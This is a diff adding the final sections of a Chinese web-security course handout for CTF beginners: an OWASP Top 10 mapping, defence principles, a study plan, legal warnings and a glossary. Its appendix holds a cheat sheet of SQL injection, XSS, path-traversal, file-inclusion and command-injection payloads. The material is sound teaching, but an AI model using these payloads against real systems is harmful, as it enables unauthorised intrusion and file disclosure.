+    <tr><td>A04</td><td>不安全设计</td><td>第 11 章 业务逻辑</td></tr>
+    <tr><td>A05</td><td>安全配置错误</td><td>第 12 章 信息泄露、默认配置</td></tr>
+    <tr><td>A06</td><td>自带缺陷和过时的组件</td><td>第 9 章 反序列化（有漏洞的库）</td></tr>
+    <tr><td>A07</td><td>身份识别和认证失效</td><td>第 11 章 认证缺陷、JWT</td></tr>
+    <tr><td>A08</td><td>软件和数据完整性失效</td><td>反序列化、不安全的 CI/CD</td></tr>
+    <tr><td>A09</td><td>安全日志和监测失效</td><td>运维安全</td></tr>
+    <tr><td>A10</td><td>服务端请求伪造（SSRF）</td><td>第 6 章 SSRF</td></tr>
+  </table>
+  <p>你会发现：<strong>前面讲的漏洞，几乎一一对应 Top 10。</strong>这说明 CTF 考的就是真实世界最严重的问题——不是在玩文字游戏。</p>
+
+  <h3>18.2 通用防御原则</h3>
+  <ol>
+    <li><strong>永不信任用户输入</strong>：所有输入都当恶意，在服务端校验。</li>
+    <li><strong>数据与代码分离</strong>：参数化查询、输出编码、模板与数据分离。</li>
+    <li><strong>最小权限</strong>：程序、数据库账号、文件系统都只给必需的权限。</li>
+    <li><strong>纵深防御</strong>：前端校验 + 服务端校验 + WAF + 监控，多层设防。</li>
+    <li><strong>默认安全</strong>：关闭不必要的服务、目录、报错详情；及时打补丁。</li>
+  </ol>
+</section>
+
+<section id="c19">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">第 19 章</span>学习路线、资源与法律底线</h2>
+
+  <h3>19.1 分阶段路线</h3>
+  <table>
+    <tr><th>阶段</th><th>重点</th></tr>
+    <tr><td>大一上</td><td>Linux 基础命令、Python 编程、HTTP 协议、HTML/JS/PHP 语法、装好 Burp/Kali</td></tr>
+    <tr><td>大一下</td><td>系统学 OWASP Top 10，每类漏洞"原理+手工利用+防御"三件套；刷 BUUCTF 对应题型</td></tr>
+    <tr><td>大二</td><td>深入一个方向（Web 渗透 / 二进制 / 密码学），学 SQLMap、代码审计、真实 CVE 分析</td></tr>
+    <tr><td>大二下以后</td><td>打真实CTF比赛、挖 SRC 漏洞、实习、参与开源安全项目</td></tr>
+  </table>
+
+  <h3>19.2 推荐资源</h3>
+  <ul>
+    <li><strong>练习平台</strong>：BUUCTF、NSSCTF、CTFtime、Hack The Box、攻防世界。</li>
+    <li><strong>系统学习</strong>：PortSwigger Web Security Academy（免费、交互式，WEB 首选）、OWASP 官方文档。</li>
+    <li><strong>书籍</strong>：《Web 安全深度剖析》《白帽子讲 Web 安全》《Metasploit 渗透测试指南》。</li>
+    <li><strong>工具</strong>：Burp Suite、sqlmap、nmap、dirsearch、蚁剑、ysoserial/phpggc。</li>
+  </ul>
+
+  <h3>19.3 法律底线（必须刻在心里）</h3>
+  <div class="goal"><span class="bt">红线，绝不能碰</span>
+  <ul>
+    <li><strong>只在授权的靶场、CTF 平台、自己的环境里练习。</strong></li>
+    <li>未经授权扫描、入侵、测试真实网站是<strong>违法</strong>的——《刑法》第 285 条（非法侵入计算机信息系统）、第 286 条（破坏计算机信息系统），《网络安全法》也有相关规定。</li>
+    <li>技术本身无罪，但使用技术的人要承担责任。<strong>能力越大，越要敬畏规则。</strong></li>
+    <li>想合法检验真实水平，走正规渠道：SRC（安全应急响应中心）平台、厂商授权的渗透测试。</li>
+  </ul></div>
+</section>
+
+<section id="c20">
+  <a class="top" href="#top">回到顶部</a>
+  <h2 class="sec"><span class="num">附录</span>术语表 · 速查 · 靶场</h2>
+
+  <h3>A. 术语表</h3>
+  <table>
+    <tr><th>术语</th><th>含义</th></tr>
+    <tr><td>payload</td><td>用来触发/利用漏洞构造的那段输入</td></tr>
+    <tr><td>EXP / POC</td><td>漏洞利用程序 / 概念验证代码</td></tr>
+    <tr><td>shell / webshell</td><td>远程控制服务器的通道；一句话木马是一种 webshell</td></tr>
+    <tr><td>RCE</td><td>Remote Code Execution，远程代码执行</td></tr>
+    <tr><td>fuzz</td><td>用大量随机/构造输入自动化测试</td></tr>
+    <tr><td>sandbox</td><td>沙箱，限制代码执行环境的机制</td></tr>
+    <tr><td>gadget</td><td>反序列化利用中可串联的代码片段</td></tr>
+    <tr><td>C2 / 跳板机</td><td>攻击控制的命令服务器 / 中转主机</td></tr>
+  </table>
+
+  <h3>B. 常用 payload / 命令速查</h3>
+  <pre><code><span class="c"># SQL 注入探测</span>
+' or 1=1--+          ' and 1=2--+
+' union select 1,2,3--+
+' and updatexml(1,concat(0x7e,database()),1)--+
+' and if(1=1,sleep(5),0)--+
+
+<span class="c"># XSS</span>
+&lt;script&gt;alert(1)&lt;/script&gt;      &lt;img src=x onerror=alert(1)&gt;
+
+<span class="c"># 文件包含伪协议</span>
+?file=php://filter/read=convert.base64-encode/resource=flag.php
+?file=../../../../etc/passwd
+
+<span class="c"># 命令注入分隔符</span>
+;cat /flag      &amp;&amp; whoami      | id      %0a id
+
+<span class="c"># curl</span>
+curl -i URL      curl -X POST -d "a=1" URL      curl -b "c=v" URL</code></pre>
+
+  <h3>C. 推荐靶场清单</h3>
+  <ul>
+    <li><strong>入门</strong>：BUUCTF、攻防世界（题目分类清晰，有 writeup）</li>
+    <li><strong>系统训练</strong>：PortSwigger Web Academy（labs 质量极高）</li>
+    <li><strong>进阶</strong>：NSSCTF、Hack The Box、Vulhub（一键搭建真实漏洞环境）</li>
+    <li><strong>本地环境</strong>：DVWA、sqli-labs（练 SQL 注入神器）、Upload-labs（练文件上传）</li>
+  </ul>
+
+  <div class="divider"></div>
+  <p class="foot">这份讲义是你 Web 安全之路的第一张地图。<br>-map 上的每个点，都要靠你亲手做过的题去点亮。祝你学得扎实、玩得开心。<br>记住：技术向善，遵守法律。—— 你的 Web 安全讲义</p>
+</section>
+
+</div>
+</body>
+</html>
